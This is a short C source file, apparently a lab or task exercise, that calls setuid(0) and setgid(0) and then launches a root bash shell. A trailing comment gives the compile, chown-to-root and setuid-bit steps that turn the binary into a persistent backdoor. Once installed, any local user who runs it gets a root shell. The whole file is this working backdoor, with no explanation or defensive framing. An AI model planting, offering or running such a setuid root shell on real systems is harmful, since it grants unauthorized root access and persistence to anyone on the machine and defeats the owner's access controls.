#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(){
	setuid(0);
	setgid(0);
	system("sudo /bin/bash");
	return 0;
}

/**
	gcc 1task.c -o 1task
	sudo chown root:root 1task
	sudo chmod u+s 1task
*/
